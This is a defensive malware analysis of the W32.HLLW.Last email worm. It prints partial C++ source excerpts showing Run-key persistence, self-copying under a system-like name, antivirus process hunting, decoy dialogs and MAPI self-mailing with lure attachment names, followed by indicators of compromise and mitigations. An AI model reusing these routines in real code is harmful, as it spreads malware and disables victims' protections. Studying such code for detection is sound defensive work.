# Dissecting W32.HLLW.Last: A Defensive Source-Level Analysis 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

W32.HLLW.Last is a Windows email worm written in C++ and compiled with Borland tools circa 2001. The author explicitly labels it as their first and last C++ worm, reflecting a period when mass-mailers leveraged the MAPI (Messaging API) stack, simple persistence, and basic anti-AV tricks. Analyzing this family at source level matters for defenders because it shows how relatively small, straightforward code can still automate propagation and degrade defenses by tampering with processes and registry keys. The specimen targets classic Windows versions (9x/ME/NT/2000), copies itself into the Windows directory under a plausible system-like name, installs a Run key for persistence, enumerates processes to kill select antivirus products, and abuses MAPI to resend itself as an attachment to harvested contacts. This report focuses on the original source file `Last.cpp`, translating its logic into defensive insights and clear indicators of compromise.

## 1 – Overview of the Malware 🧩

W32.HLLW.Last is a mass-mailing worm. Its primary objectives are: (1) establish persistence by copying itself as `MSKern32.exe` to the Windows directory and creating a Run key, (2) disrupt protection by terminating well-known AV processes (Norton, Panda), (3) optionally drop a vanity HTML page on December 1, and (4) propagate via MAPI by replying to email originators with a message and an attached copy of itself under various enticing filenames (e.g., `IEPatch.exe`, `New_Game.exe`).

The infection vector is user execution of the worm binary. Once run, it shows a decoy error dialog (randomly selected from a list) to appear benign or broken, then performs installation. It persists via `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` under the value name `MS Kernel32`. For spread, it opens a new MAPI session, iterates messages with `MAPIFindNext`, reads envelope metadata with `MAPIReadMail`, then crafts and sends messages with `MAPISendMail` to the original sender (originator) of found messages, attaching its own file path.

A secondary behavior enumerates `.ht*` and `.doc` files in the user documents folder and records them to `C:\\liste.txt`, marking this file hidden—likely a crude inventory or lure-building artifact. Additionally, on December 1st it creates `C:\\PetiK_Dir\\petikvx.htm` with a farewell note and opens it in the default browser.

## 2 – Source Code Analysis 🔍

### 2.1 Core Logic and Payload

Purpose: Entry point orchestrates service registration (Win9x), path discovery, self-copy, persistence, AV tampering, optional HTML drop (date-trigger), basic decoy, and the final propagation call.

```cpp
// WinMain — core setup (inert excerpt; do NOT execute)
HMODULE k32 = GetModuleHandle("KERNEL32.DLL");
if (k32) {
    (FARPROC &)RegSerPro = GetProcAddress(k32, "RegisterServiceProcess");
    if (RegSerPro) RegSerPro(NULL, 1);   // Register as service (Win9x)
}
GetModuleFileName(hInst, filename, 100);
GetWindowsDirectory((char *)windir, 100);
strcpy(windr, windir);
strcat(windir, "\\MSKERN32.EXE");
if ((lstrcmp(filename, windir)) != 0) { Welcome(); } // decoy error
```

Impact: On Windows 9x/ME it attempts to hide/linger as a “service” process. It discovers its current path and the Windows directory, then triggers a fake welcome/error message when not already installed in the target location, creating user confusion while installation proceeds.

### 2.2 Persistence and Propagation

Purpose: Copy itself to `%WINDIR%\\MSKern32.exe` and set an autorun entry in HKLM. The values intentionally mimic system naming conventions.

```cpp
// Installation and persistence (inert excerpt; do NOT execute)
strcat(windr, "\\MSKern32.exe");
CopyFile(filename, windr, 0);                // self-copy to Windows dir
RegOpenKeyEx(HKEY_LOCAL_MACHINE, Run, 0, KEY_WRITE, &hReg);
RegSetValueEx(hReg, "MS Kernel32", 0, REG_SZ, (BYTE *)windr, 100);
RegCloseKey(hReg);
```

Impact: Creates a predictable file (IOC) and a Run key under HKLM, enabling systemwide autorun on reboot. The name `MSKern32.exe` plus value `MS Kernel32` impersonates system components to evade casual scrutiny.

For email spread, it logs on to the default MAPI profile and iterates message IDs, then targets each message originator.

```cpp
// MAPI setup and loop (inert excerpt; do NOT execute)
hMAPI = LoadLibrary("MAPI32.DLL");
(FARPROC &)mLogon    = GetProcAddress(hMAPI, "MAPILogon");
(FARPROC &)mFindNext = GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC &)mReadMail = GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC &)mSendMail = GetProcAddress(hMAPI, "MAPISendMail");
mLogon(NULL, NULL, NULL, MAPI_NEW_SESSION, NULL, &session);
if (mFindNext(session, 0, NULL, NULL, MAPI_LONG_MSGID, NULL, messId) == SUCCESS_SUCCESS) {
    // ... iterate and craft messages
}
```

Impact: Abuse of MAPI allows headless mass-mailing through the user’s configured client. The worm depends on a working MAPI environment and inherited credentials.

### 2.3 Evasion and Obfuscation (Anti-AV, Decoys, Artefacts)

Purpose: Terminate specific antivirus processes if found; display fake error dialogs; drop files to reduce suspicion or mark presence.

```cpp
// AV process termination (inert excerpt; do NOT execute)
lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
rProcessFound = Process32First(lSnapshot, &uProcess);
while (rProcessFound) {
    if (strstr(uProcess.szExeFile, "NAVAPW32.EXE")) { /* kill Norton */ }
    if (strstr(uProcess.szExeFile, "PAVSCHED.EXE")) { /* kill Panda  */ }
    rProcessFound = Process32Next(lSnapshot, &uProcess);
}
CloseHandle(lSnapshot);
```

Impact: Attempts to weaken defenses by forcefully terminating antivirus services. This is noisy and detectable (process tampering, toolhelp enumeration).

The decoy dialog tries to look like common Windows errors to mislead the user.

```cpp
// Decoy dialog (inert excerpt; do NOT execute)
MessageBeep(MB_ICONHAND);
MessageBox(NULL, text[GetTickCount() & 3], filename,
           MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
```

Impact: Presents a plausible but fake failure message chosen from a small list (e.g., “Loader Error…”, “Error with Kernel32…”), potentially delaying suspicion while persistence is set.

On specific date (Dec 1), it drops and opens an HTML page.

```cpp
// Date-triggered HTML drop (inert excerpt; do NOT execute)
GetSystemTime(&syst);
if (syst.wDay == 1 && syst.wMonth == 12) {
    CreateDirectory("C:\\PetiK_Dir", 0);
    htm = fopen("petikvx.htm", "w");   // vanity page
    // fprintf(... many lines ...)
    ShellExecute(0, "open", "petikvx.htm", 0, 0, SW_SHOWNORMAL);
}
```

Impact: Creates a conspicuous artefact under `C:\\PetiK_Dir` and opens it—useful as an IOC tied to date or to post-infection analysis.

### 2.4 Communication Routines (MAPI Send)

Purpose: Compose a new message to the originator of existing mail, with lures and an attached copy of the worm renamed to plausible filenames.

```cpp
// Crafting the message (inert excerpt; do NOT execute)
count = (unsigned long)(syst.wMilliseconds * syst.wMinute);
while (count > 5) count = (unsigned long)(count / 2); // index 0..5
mess->lpszSubject  = sujet[count];        // e.g., "Internet Explorer 5.0/6.0 Patch"
mess->lpszNoteText = corps[count];        // short lure text
mess->nFileCount   = 1;
mess->lpFiles = (MapiFileDesc*)malloc(sizeof(MapiFileDesc));
memset(mess->lpFiles, 0, sizeof(MapiFileDesc));
mess->lpFiles->lpszPathName = filename;   // path to current executable
mess->lpFiles->lpszFileName = attachfile[count]; // e.g., "IEPatch.exe"
mSendMail(session, NULL, mess, NULL, NULL);
```

Impact: Subject/body pairs are selected pseudo-randomly based on time; the attachment name is varied to increase social engineering effectiveness. The path `filename` refers to the running copy, so recipients receive the worm binary itself.

Additionally, the function `htmfile()` enumerates user documents and writes a list to disk:

```cpp
// Crude file inventory (inert excerpt; do NOT execute)
RegOpenKeyEx(HKEY_USERS, Persona, 0, KEY_QUERY_VALUE, &hReg);
RegQueryValueEx(hReg, "Personal", 0, &type, done, &siz); // "My Documents"
SetCurrentDirectory(done);
// For *.ht* and *.doc, write entries into C:\\liste.txt
WritePrivateProfileString("DOC Files", ffile.cFileName,
                          "Found by W32.HLLW.Last", "C:\\liste.txt");
SetFileAttributes("C:\\liste.txt", FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN);
```

Impact: Produces a hidden plaintext artefact (`C:\\liste.txt`) listing local `.ht*` and `.doc` files. Motive is unclear (telemetry or lure preparation), but it is a strong, host-based IOC.

## 3 – Mitigation and Defense Strategies 🛡️

### Detection Strategies (Analyst Focus)

- Registry-based IOCs: `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MS Kernel32 = %WINDIR%\\MSKern32.exe`.
- File-based IOCs: `%WINDIR%\\MSKern32.exe`, `C:\\PetiK_Dir\\petikvx.htm` (Dec. 1 trigger), hidden `C:\\liste.txt` with sections “HTM,HTML Files” and “DOC Files”.
- Process behavior: Toolhelp32 snapshot enumeration followed by `OpenProcess`/`TerminateProcess` on `NAVAPW32.EXE` and `PAVSCHED.EXE`.
- MAPI usage: `MAPI32.DLL` loaded dynamically; sequence of `MAPILogon` → `MAPIFindNext` → `MAPIReadMail` → `MAPISendMail` without user prompts.
- String/YARA hints: value name `MS Kernel32`, exe name `MSKern32.exe`, subjects like “Internet Explorer 5.0/6.0 Patch”, attachment names `IEPatch.exe`, `New_Game.exe`, and the marker `Found by W32.HLLW.Last`.
- Telemetry: MessageBox decoys at first run; browser launch opening `petikvx.htm` on Dec 1.

### Prevention Strategies (Admin Focus)

- Enforce tamper protection: block untrusted processes from calling `OpenProcess(PROCESS_ALL_ACCESS)` and `TerminateProcess` on security tools.
- Limit legacy MAPI: disable or restrict MAPI programmatic access; enable prompts or admin auditing for `MAPISendMail` calls from unknown processes.
- Application control: use AppLocker/WDAC to deny execution from user-writable locations and to only allow signed binaries; flag binaries named like system components (e.g., `*Kern32.exe`).
- Registry hardening: monitor and protect autorun keys under HKLM; deploy EDR rules to alert on new Run values pointing to `%WINDIR%\\*.exe` with atypical names.
- Email security: strip executable attachments by policy; educate users about lures; enable attachment sandboxing and URL rewriting where applicable.
- Backup and recovery: maintain offline backups; isolate machines exhibiting the IOCs listed.

## Conclusion

W32.HLLW.Last exemplifies early 2000s mass-mailing worms: simple persistence via Run keys, crude anti-AV by process killing, and MAPI-driven self-mailing with social-engineering subjects. Despite its age and simplicity, the code demonstrates automation across system APIs that remain relevant to defensive telemetry today. For modern defenders, the key lessons are to monitor for process tampering, harden autorun registry paths, constrain programmatic email access, and look for low-noise artefacts like hidden inventory files. Studying source-level implementations like `Last.cpp` reinforces how small, legible codebases can still produce disruptive behavior—and why layered controls and vigilant monitoring are essential.